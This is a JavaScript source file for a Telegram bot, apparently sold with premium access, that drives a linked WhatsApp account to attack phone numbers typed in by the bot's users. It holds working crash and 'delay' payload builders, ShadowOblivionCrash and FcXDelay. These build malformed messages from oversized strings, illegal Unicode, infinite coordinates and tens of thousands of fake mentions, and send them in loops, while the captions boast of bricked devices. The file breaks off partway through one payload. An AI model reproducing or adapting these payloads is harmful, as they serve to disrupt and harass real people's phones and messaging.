const { Telegraf, Markup, session } = require("telegraf");
const fs = require('fs');
const moment = require('moment-timezone');
const {
    makeWASocket,
    makeInMemoryStore,
    fetchLatestBaileysVersion,
    useMultiFileAuthState,
    DisconnectReason,
    generateWAMessageFromContent
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const chalk = require('chalk');
const { BOT_TOKEN } = require("./config");
const crypto = require('crypto');
const premiumFile = './premiumuser.json';
const ownerFile = './owneruser.json';
let bots = [];
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const path = require('path');
const { exec } = require('child_process');
const bot = new Telegraf(BOT_TOKEN);

bot.use(session());

let shadow = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const blacklist = ["6142885267", "7275301558", "1376372484"];

const randomImages = [
"https://files.catbox.moe/5ydrgs.jpeg",
"https://files.catbox.moe/1pqo7d.jpeg",
"https://files.catbox.moe/wpsv47.jpeg",
"https://files.catbox.moe/d03s15.jpeg"
];

const getRandomImage = () => randomImages[Math.floor(Math.random() * randomImages.length)];

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);

    return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});





function startBot() {
  console.log(chalk.blue(`🅆🄴🄻🄲🄾🄼🄴 🅃🄾 🄾🄱🄻🄸🅅🄸🄾🄽`));
}

// --- Koneksi WhatsApp ---
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }), // Log level diubah ke "info"
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'P', // Placeholder, you can change this or remove it
        }),
    };

    shadow = makeWASocket(connectionOptions);

    shadow.ev.on('creds.update', saveCreds);
    store.bind(shadow.ev);

    shadow.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.white.bold(`
╭──────────────────────⟤
│  ${chalk.green.bold('🟢 WHATSAPP: ONLINE')}
╰──────────────────────⟤`));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.white.bold(`
╭──────────────────────⟤
│ ${chalk.red.bold('🔴 WHATSAPP DISCONNECTED')}
╰──────────────────────⟤`),
                shouldReconnect ? chalk.white.bold(`
╭──────────────────────⟤
│ ${chalk.red.bold('↻ RECONNECT REQUIRED')}
╰──────────────────────⟤`) : ''
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
}

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

// Muat ID owner dan pengguna premium
let ownerUsers = loadJSON(ownerFile);
let premiumUsers = loadJSON(premiumFile);

// Middleware untuk memeriksa apakah pengguna adalah owner
const checkOwner = (ctx, next) => {
    if (!ownerUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("⛔ You are not the owner.");
    }
    next();
};

const checkPremium = (ctx, next) => {
    if (!premiumUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("🔒 Premium access required. Purchase premium @Vortex_Shadow");
    }
    next();
};

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("⚠️ WhatsApp not connected. Please pair using the Pairing Code first.");
        return;
    }
    next();
};

bot.command('start', async (ctx) => {
    const userId = ctx.from.id.toString();

    if (blacklist.includes(userId)) {
        return ctx.reply("🚫 You are blacklisted and cannot use this bot.");
    }

    const randomImage = getRandomImage();
    const uptime = getUptime();

    await ctx.replyWithPhoto(randomImage, {
        caption: `\`\`\`
┏━━〘 𝐎𝐁𝐋𝐈𝐕𝐈𝐎𝐍 〙━━┓
┃☬ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫: @Vortex_Shadow2563
┃☬ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧: 𝟏.𝟎
┃☬ 𝐋𝐚𝐧𝐠𝐮𝐚𝐠𝐞: 𝐉𝐚𝐯𝐚𝐒𝐜𝐫𝐢𝐩𝐭
┃☬ 𝐔𝐩𝐭𝐢𝐦𝐞: ${uptime}┗━━━━━━━━━━━━━━━━━━━━━━┛
┏━━━〔 𝐎𝐁𝐋𝐈𝐕𝐈𝐎𝐍 𝐁𝐔𝐆𝐒 〕━━┓
┃☬ /andro 234xxx
┃☬ /crash-ios 234xxx
┃☬ /invisdelay 234xxx
┃☬ /samsung 234xxx
┗━━━━━━━━━━━━━━━━━━━━━━┛
┏━━━〔 𝐂𝐎𝐍𝐓𝐑𝐎𝐋 𝐏𝐀𝐍𝐄𝐋 〕━━┓
┃☬ /addprem [user]
┃☬ /delprem [user]
┃☬ /checkprem [user]
┃☬ /pair
┃☬ /delpair 
┗━━━━━━━━━━━━━━━━━━━━━━┛\`\`\``,
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [
                Markup.button.callback('𝐚𝐧𝐝𝐫𝐨', 'andro_btn'),
                Markup.button.callback('𝐜𝐫𝐚𝐬𝐡-𝐢𝐨𝐬', 'crash-ios_btn')
            ],
            [
                Markup.button.callback('𝐢𝐧𝐯𝐢𝐬𝐝𝐞𝐥𝐚𝐲', 'invisdelay_btn'),
               Markup.button.callback('𝐒𝐚𝐦𝐬𝐮𝐧𝐠','samsung_btn ')
            ],
 [
           Markup.button.url ('𝐂𝐎𝐍𝐓𝐀𝐂𝐓 𝐎𝐖𝐍𝐄𝐑', 't.me/Vortex_Shadow2563')
            ]
                   ])
    });
});

bot.command("invisdelay", checkWhatsAppConnection, checkPremium, checkOwner, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  
  if (!q) {
    return ctx.replyWithPhoto(
      getRandomImage(),
      { caption: "⚠️ Example: /invisdelay 234123456789", parse_mode: "Markdown" }
    );
  }

  const cleanNumber = q.replace(/[^0-9]/g, '');
  const target = cleanNumber + "@s.whatsapp.net";

  // Progress bar generator
  const getProgressBar = (percent) => {
    const filled = '▰';
    const empty = '▱';
    const progress = Math.round(percent / 10);
    return filled.repeat(progress) + empty.repeat(10 - progress);
  };

  // Send initial attack message
  const loadingMsg = await ctx.replyWithPhoto(
    getRandomImage(),
    {
      caption: `🚀 *Launching Delay Annihilation*\n\n${getProgressBar(0)} 0%\n\n📱 Target: ${cleanNumber}\n⚡ Status: Initializing payload...`,
      parse_mode: "Markdown"
    }
  );

  try {
    const totalCycles = 200;
    const attacksPerCycle = 10; // Count of all attack functions in your loop
    
    for (let r = 0; r < totalCycles; r++) {
      // Execute attack sequence
        await RyuichiBrutalDelay(target, false);
        await ZeroXIosFreezeDelay(target, false, true);
        await delayMaker(target);
        await FcXDelay(target);
        await RyuichiBrutalDelay(target, false);
        await ZeroXIosFreezeDelay(target, false, true);
        await delayMaker(target);

        await FcXDelay(target);
        await RyuichiBrutalDelay(target, false);
        await ZeroXIosFreezeDelay(target, false, true);
        await sleep(500);
        await DelayInVis(target, false);

        await FcXDelay(target);        
        await RyuichiBrutalDelay(target, false);
        await ZeroXIosFreezeDelay(target, false, true);
        await delayMaker(target);
        await RyuichiBrutalDelay(target, false);

        await FcXDelay(target);        
        await ZeroXIosFreezeDelay(target, false, true);
        await RyuichiBrutalDelay(target, false);
        await ZeroXIosFreezeDelay(target, false, true);
        await delayMaker(target)

      // Update progress every 50 cycles or final iteration
      if (r % 50 === 0 || r === totalCycles - 1) {
        const percent = Math.floor((r / totalCycles) * 100);
        const attacksSent = r * attacksPerCycle;
        
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          loadingMsg.message_id,
          undefined,
          `💣 *DELAY Target*\n\n${getProgressBar(percent)} ${percent}%\n\n📊 Stats:\n├ Cycles: ${r}/${totalCycles}\n├ Attacks: ${attacksSent}\n└ Status: ${percent < 30 ? "Bypassing defenses" : percent < 70 ? "Corrupting system" : "Final destruction"}`,
          { parse_mode: "Markdown" }
        );
      }
    }
  } finally {
    // Clean up loading message
    try {
      await ctx.telegram.deleteMessage(ctx.chat.id, loadingMsg.message_id);
    } catch (e) {
      console.log("Message deletion failed:", e.message);
    }

    // Send final annihilation report
    await ctx.replyWithPhoto(
      getRandomImage(),
      {
        caption: `☠️ *DELAY ANNIHILATION COMPLETE*\n\n${getProgressBar(100)} 100%\n\n📊 Final Report:\n├ Target: ${cleanNumber}\n├ Total Cycles: 100\n├ Attacks Sent: 20\n└ Damage: IRREVERSIBLE\n\n⚠️ Device is now on delay`,
        parse_mode: "Markdown"
      }
    );
  }
});

bot.command("andro", checkWhatsAppConnection, checkPremium, checkOwner, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  
  if (!q) {
    return ctx.replyWithPhoto(
      getRandomImage(),
      { caption: "⚠️ Example: /andro 234123456789", parse_mode: "Markdown" }
    );
  }

  const cleanNumber = q.replace(/[^0-9]/g, '');
  const target = cleanNumber + "@s.whatsapp.net";

  // Progress bar generator
  const getProgressBar = (percent) => {
    const filled = '▰';
    const empty = '▱';
    const progress = Math.round(percent / 10);
    return filled.repeat(progress) + empty.repeat(10 - progress);
  };

  // Send initial attack message
  const loadingMsg = await ctx.replyWithPhoto(
    getRandomImage(),
    {
      caption: `🚀 *Launching Android Annihilation*\n\n${getProgressBar(0)} 0%\n\n📱 Target: ${cleanNumber}\n⚡ Status: Initializing payload...`,
      parse_mode: "Markdown"
    }
  );

  try {
    const totalCycles = 10;
    const attacksPerCycle = 10; // Count of all attack functions in your loop
    
    for (let r = 0; r < totalCycles; r++) {
await ShadowOblivionCrash(target)

      // Update progress every 50 cycles or final iteration
      if (r % 50 === 0 || r === totalCycles - 1) {
        const percent = Math.floor((r / totalCycles) * 100);
        const attacksSent = r * attacksPerCycle;
        
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          loadingMsg.message_id,
          undefined,
          `💣 *Destroying Android Target*\n\n${getProgressBar(percent)} ${percent}%\n\n📊 Stats:\n├ Cycles: ${r}/${totalCycles}\n├ Attacks: ${attacksSent}\n└ Status: ${percent < 30 ? "Bypassing defenses" : percent < 70 ? "Corrupting system" : "Final destruction"}`,
          { parse_mode: "Markdown" }
        );
      }
    }
  } finally {
    // Clean up loading message
    try {
      await ctx.telegram.deleteMessage(ctx.chat.id, loadingMsg.message_id);
    } catch (e) {
      console.log("Message deletion failed:", e.message);
    }

    // Send final annihilation report
    await ctx.replyWithPhoto(
      getRandomImage(),
      {
        caption: `☠️ *ANDROID ANNIHILATION COMPLETE*\n\n${getProgressBar(100)} 100%\n\n📊 Final Report:\n├ Target: ${cleanNumber}\n├ Total Cycles: 50\n├ Attacks Sent: 20\n└ Damage: IRREVERSIBLE\n\n⚠️ Device is permanently compromised`,
        parse_mode: "Markdown"
      }
    );
  }
});

bot.command("Crash-ios", checkWhatsAppConnection, checkOwner, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  
  if (!q) {
    return ctx.replyWithPhoto(
      getRandomImage(),
      { caption: "⚠️ Example: /Crash-ios 234123456789", parse_mode: "Markdown" }
    );
  }

  const cleanNumber = q.replace(/[^0-9]/g, '');
  const target = cleanNumber + "@s.whatsapp.net";

  // Progress bar generator
  const getProgressBar = (percent) => {
    const filled = '▰';
    const empty = '▱';
    const progress = Math.round(percent / 10);
    return filled.repeat(progress) + empty.repeat(10 - progress);
  };

  // Send initial attack message with image
  const loadingMsg = await ctx.replyWithPhoto(
    getRandomImage(), 
    {
      caption: `🚀 *Launching iOS Crash Attack*\n\n${getProgressBar(0)} 0%\n\n📱 Target: ${cleanNumber}\n⚡ Status: Initializing...`,
      parse_mode: "Markdown"
    }
  );

  try {
    // Attack sequence with progress updates
    const totalAttacks = 50;
    for (let i = 0; i < totalAttacks; i++) {
       await iosinVis(target);
      await ForceInvisibleCoreNew(target)
      
      // Update progress every 5 attacks
      if (i % 5 === 0 || i === totalAttacks - 1) {
        const percent = Math.floor((i / totalAttacks) * 100);
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          loadingMsg.message_id,
          undefined,
          `💥 *Crashing iOS Device*\n\n${getProgressBar(percent)} ${percent}%\n\n📱 Target: ${cleanNumber}\n⚡ Status: ${percent < 50 ? "Breaking defenses..." : "Destroying core..."}`,
          { parse_mode: "Markdown" }
        );
      }
      
      if (i % 20 === 0) await sleep(300); // Prevent flooding
    }
  } finally {
    // Clean up loading message
    try {
      await ctx.telegram.deleteMessage(ctx.chat.id, loadingMsg.message_id);
    } catch (e) {
      console.log("Message already deleted or expired");
    }

    // Send final destruction report with NEW image
    await ctx.replyWithPhoto(
      getRandomImage(),
      {
        caption: `☠️ *iOS Device Destroyed*\n\n${getProgressBar(100)} 100%\n\n📊 Attack Report:\n├ Target: ${cleanNumber}\n├ Total Attacks: 100\n└ Status: TARGET CRASHED\n\n⚠️ Device may remain unusable`,
        parse_mode: "Markdown"
      }
    );
  }
});

bot.command("samsung", checkWhatsAppConnection, checkOwner, checkPremium, async ctx => {
  const args = ctx.message.text.split(" ");
  
  if (args.length < 2) {
    return ctx.replyWithPhoto(
      getRandomImage(),
      { caption: "⚠️ Example: /samsung 234123456789", parse_mode: "Markdown" }
    );
  }

  const cleanNumber = args[1].replace(/[^0-9]/g, '');
  const target = cleanNumber + "@s.whatsapp.net";

  // ====== LOADING BAR ANIMATION ====== //
  const loadingChars = ['▱', '▰'];
  let loadingState = 0;
  
  // Create initial loading message
  const loadingMsg = await ctx.replyWithPhoto(
    getRandomImage(),
    {
      caption: `🔄 *Preparing Samsung Attack*\n\n${loadingChars[1].repeat(0)}${loadingChars[0].repeat(10)} 0%\n\n📱 Target: ${cleanNumber}\n⚙️ Initializing systems...`,
      parse_mode: "Markdown"
    }
  );

  // Animation updater
  const updateInterval = setInterval(async () => {
    loadingState = (loadingState + 1) % 10;
    const progress = loadingState * 10;
    try {
      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        loadingMsg.message_id,
        undefined,
        `🔄 *Preparing Samsung Attack*\n\n${loadingChars[1].repeat(loadingState)}${loadingChars[0].repeat(10-loadingState)} ${progress}%\n\n📱 Target: ${cleanNumber}\n⚙️ Loading modules...`,
        { parse_mode: "Markdown" }
      );
    } catch (e) {
      clearInterval(updateInterval);
    }
  }, 300); // Update every 300ms

  try {
    // ====== MAIN ATTACK SEQUENCE ====== //
    const totalRounds = 20;
    for (let i = 0; i < totalRounds; i++) {
      // Update progress for actual attacks
      const realProgress = Math.floor((i / totalRounds) * 100);
      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        loadingMsg.message_id,
        undefined,
        `💥 *Crashing Samsung Device*\n\n${loadingChars[1].repeat(Math.floor(realProgress/10))}${loadingChars[0].repeat(10-Math.floor(realProgress/10))} ${realProgress}%\n\n📊 Status: ${realProgress < 50 ? "Overloading memory" : "Corrupting system files"}`,
        { parse_mode: "Markdown" }
      );

      // Execute attack sequence
      await SAMSUNGCRASH(target);
      await invisSamsung(target); 
      await chatSamsung(target);
      
      // Add slight delay between attack waves
      if (i % 5 === 0) await sleep(300);
    }

    // ====== FINAL RESULT ====== //
    clearInterval(updateInterval);
    await ctx.telegram.deleteMessage(ctx.chat.id, loadingMsg.message_id);
    
    await ctx.replyWithPhoto(
      getRandomImage(),
      {
        caption: `☠️ *SAMSUNG DESTROYED*\n\n${loadingChars[1].repeat(10)} 100%\n\n📋 Damage Report:\n├ Target: ${cleanNumber}\n├ Attack Waves: 20\n└ System Status: BRICKED\n\n⚠️ Device is permanently damaged`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[
            { text: "⚠️ Warning", callback_data: "danger" }
          ]]
        }
      }
    );

  } catch (error) {
    clearInterval(updateInterval);
    console.error("Attack failed:", error);
    await ctx.reply("❌ Attack failed! Check console for details.");
  }
});

bot.command('delpair', checkOwner, async (ctx) => {
    // Send initial processing message
    const processingMsg = await ctx.replyWithPhoto(
        getRandomImage(),
        {
            caption: "♻️ *Session Reset Initiated*\n\n▱▱▱▱▱▱▱▱▱▱ 0%\n\n⚙️ Preparing to delete session files...",
            parse_mode: "Markdown"
        }
    );

    try {
        // Update progress
        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processingMsg.message_id,
            undefined,
            "♻️ *Session Reset Initiated*\n\n▰▱▱▱▱▱▱▱▱▱ 20%\n\n🗑️ Deleting session files...",
            { parse_mode: "Markdown" }
        );

        // Delete session files
        const sessionDir = './session';
        if (fs.existsSync(sessionDir)) {
            fs.readdirSync(sessionDir).forEach(file => {
                fs.unlinkSync(path.join(sessionDir, file));
            });
            fs.rmdirSync(sessionDir);
        }

        // Update progress
        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processingMsg.message_id,
            undefined,
            "♻️ *Session Reset Complete*\n\n▰▰▰▰▰▰▰▰▰▰ 100%\n\n✅ Session files successfully deleted please repair",
            { parse_mode: "Markdown" }
        );

    } catch (error) {
        console.error('Session reset failed:', error);
        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processingMsg.message_id,
            undefined,
            "❌ *Session Reset Failed*\n\n⚠️ Error deleting session files\n\n" + error.message,
            { parse_mode: "Markdown" }
        );
    }
});

bot.command('addprem', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ 𝐄𝐧𝐭𝐞𝐫 𝐭𝐡𝐞 𝐮𝐬𝐞𝐫 𝐈𝐃 𝐲𝐨𝐮 𝐰𝐚𝐧𝐭 𝐭𝐨 𝐦𝐚𝐤𝐞 𝐩𝐫𝐞𝐦𝐢𝐮𝐦.\𝐧𝐄𝐱𝐚𝐦𝐩𝐥𝐞: /addprem 123456789");
    }

    const userId = args[1];

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ 𝐔𝐬𝐞𝐫 ${userId} 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐡𝐚𝐬 𝐩𝐫𝐞𝐦𝐢𝐮𝐦 𝐬𝐭𝐚𝐭𝐮𝐬.`);
    }

    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🎉 𝐔𝐬𝐞𝐫 ${userId} 𝐧𝐨𝐰 𝐡𝐚𝐬 𝐩𝐫𝐞𝐦𝐢𝐮𝐦 𝐚𝐜𝐜𝐞𝐬𝐬!`);
});


bot.command('delprem', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ 𝐄𝐧𝐭𝐞𝐫 𝐭𝐡𝐞 𝐮𝐬𝐞𝐫 𝐈𝐃 𝐲𝐨𝐮 𝐰𝐚𝐧𝐭 𝐭𝐨 𝐫𝐞𝐦𝐨𝐯𝐞 𝐟𝐫𝐨𝐦 𝐩𝐫𝐞𝐦𝐢𝐮𝐦.\𝐧𝐄𝐱𝐚𝐦𝐩𝐥𝐞: /delprem 123456789");
    }

    const userId = args[1];

    if (!premiumUsers.includes(userId)) {
        return ctx.reply(`❌ 𝐔𝐬𝐞𝐫 ${userId} 𝐢𝐬 𝐧𝐨𝐭 𝐢𝐧 𝐩𝐫𝐞𝐦𝐢𝐮𝐦 𝐥𝐢𝐬𝐭.`);
    }

    premiumUsers = premiumUsers.filter(id => id !== userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🚫 𝐔𝐬𝐞𝐫 ${userId} 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐫𝐞𝐦𝐨𝐯𝐞𝐝 𝐟𝐫𝐨𝐦 𝐭𝐡𝐞 𝐩𝐫𝐞𝐦𝐢𝐮𝐦 𝐥𝐢𝐬𝐭.`);
});

// Perintah untuk mengecek status premium
bot.command('checkprem', (ctx) => {
    const userId = ctx.from.id.toString();

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ 𝐘𝐨𝐮 𝐚𝐫𝐞 𝐚 𝐩𝐫𝐞𝐦𝐢𝐮𝐦 𝐮𝐬𝐞𝐫.`);
    } else {
        return ctx.reply(`❌ 𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚 𝐩𝐫𝐞𝐦𝐢𝐮𝐦 𝐮𝐬𝐞𝐫.`);
    }
});

// Command untuk pairing WhatsApp
bot.command("pair", checkOwner, async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return await ctx.reply("❌ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐟𝐨𝐫𝐦𝐚𝐭 𝐢𝐬 𝐢𝐧𝐜𝐨𝐫𝐫𝐞𝐜𝐭. 𝐔𝐬𝐞: /𝐩𝐚𝐢𝐫 <𝐰𝐚_𝐧𝐮𝐦𝐛𝐞𝐫>");
    }

    let phoneNumber = args[1];
    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');

    if (shadow && shadow.user) {
        return await ctx.reply("𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐢𝐬 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐜𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝. 𝐍𝐨 𝐧𝐞𝐞𝐝 𝐭𝐨 𝐩𝐚𝐢𝐫 𝐚𝐠𝐚𝐢𝐧.");
    }

    try {
        const code = await shadow.requestPairingCode(phoneNumber);
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

        const pairingMessage = 
            `✅ <b>WhatsApp Pairing Successful!</b>\n\n` +
            `🌍 <b>Number:</b> <code>${phoneNumber}</code>\n` +
            `🔢 <b>Pairing Link:</b> <a href="https://www.whatsapp.com/otp/code/?otp_type=COPY_CODE&code=${formattedCode}">Click here to pair</a>\n\n` +
            `▸ Or use code manually in WhatsApp > Linked Devices\n\n` +
            `⚠️ <i>Code expires in 5 minutes</i>`;

        await ctx.replyWithHTML(pairingMessage);
    } catch (error) {
        console.error(chalk.red('Failed to pair:'), error);
        await ctx.reply("❌ Pairing failed. Make sure the WhatsApp number is valid and can receive SMS.");
    }
});

// Fungsi untuk merestart bot menggunakan PM2
const restartBot = () => {
  pm2.connect((err) => {
    if (err) {
      console.error('Failed to connect to PM2:', err);
      return;
    }

    pm2.restart('index', (err) => { // 'index' adalah nama proses PM2 Anda
      pm2.disconnect(); // Putuskan koneksi setelah restart
      if (err) {
        console.error('failed to restart bot:', err);
      } else {
        console.log('Bot restarted successfully.');
      }
    });
  });
};



// Command untuk restart
bot.command('restart', (ctx) => {
  const userId = ctx.from.id.toString();
  ctx.reply('Restarting bot...');
  restartBot();
});
  
// ========================= [ ANDRO ] =========================
async function ShadowOblivionCrash(target) {
  try {
    const corruptedJson = "{".repeat(500000); // buffer overload
    const brokenUnicode = "\uDBFF\uDFFF".repeat(100000); // illegal surrogates
    const payload = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: brokenUnicode,
              locationMessage: {
                degreesLatitude: Infinity,
                degreesLongitude: -Infinity,
                name: "{".repeat(80000),
                address: "☠️".repeat(60000)
              },
              locationMessageV2: {
                degreesLatitude: 1e308,
                degreesLongitude: -1e308,
                name: "\u200E".repeat(60000),
                address: "𓂀𒀭𒈔".repeat(40000)
              }
            },
            body: {
              text: "\u200D".repeat(50000) + "Shadow"
            },
            nativeFlowMessage: {
              messageParamsJson: corruptedJson
            },
            contextInfo: {
              participant: "0@s.whatsapp.net",
              mentionedJid: Array.from({ length: 3000 }, () =>
                `1${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`
              ),
              quotedMessage: {
                viewOnceMessage: {
                  message: {
                    interactiveMessage: {
                      body: {
                        text: "🧬 Recursive Bomb",
                        format: "DEFAULT"
                      },
                      nativeFlowResponseMessage: {
                        name: "crashloop",
                        paramsJson: corruptedJson,
                        version: 9999999
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    };

    const msg = await generateWAMessageFromContent(target, payload, {
      quoted: null,
      messageId: "shadow_" + Date.now()
    });

    await shadow.relayMessage(target, msg.message, {
      messageId: msg.key.id
    });

    console.log(`💥 ShadowOblivionCrash sent to ${target}`);
  } catch (err) {
    console.error("❌ Failed to send:", err);
  }
}

// ================== DELAY ================= //
async function FcXDelay(target) {
let bokepFc = JSON.stringify({
status: true,
criador: "ForceClose",
resultado: {
type: "md",
ws: {
_events: { "CB:ib,,dirty": ["Array"] },
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebconnetUrl: "wss://web.whatsapp.com/ws/chat",
connCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: { Object: "authData" },
markOnlineOnconnCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: { Object: "transactionOptsData" },
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: { Object: "appStateMacData" },
mobile: true
}
}
}
});

let bokepFcV2 = JSON.stringify({
status: true,
criador: "ForceClose",
resultado: {
type: "md",
ws: {
_events: { "CB:ib,,dirty": ["Array"] },
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebconnetUrl: "wss://web.whatsapp.com/ws/chat",
connCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: { Object: "authData" },
markOnlineOnconnCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: { Object: "transactionOptsData" },
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: { Object: "appStateMacData" },
mobile: true
}
}
}
});
const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: " ",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: ".SkyzoDevoper",
                                    title: "gtau",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});
const contextInfo = {
mentionedJid: [target],
isForwarded: true,
forwardingScore: 999,
businessMessageForwardInfo: {
businessOwnerJid: target
}
};

let messagePayload = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
